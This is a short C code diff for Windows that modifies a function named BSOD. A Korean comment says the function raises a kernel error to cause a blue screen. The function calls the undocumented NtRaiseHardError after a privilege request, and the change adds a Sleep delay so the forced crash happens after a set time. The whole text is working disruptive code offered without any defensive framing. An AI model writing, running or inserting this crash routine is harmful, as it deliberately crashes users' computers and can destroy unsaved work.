@@ -2,8 +2,9 @@
 #include <winternl.h>
 
 // 커널에 오류를 일으켜 블루스크린을 발생
-void BSOD()
+void BSOD(uint32 delay)
 {
+    Sleep(delay);
     typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus,
         ULONG NumberOfParameters,
         ULONG UnicodeStringParameterMask OPTIONAL,
@@ -22,5 +23,4 @@ void BSOD()
     pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
     NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
     NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
-
 }
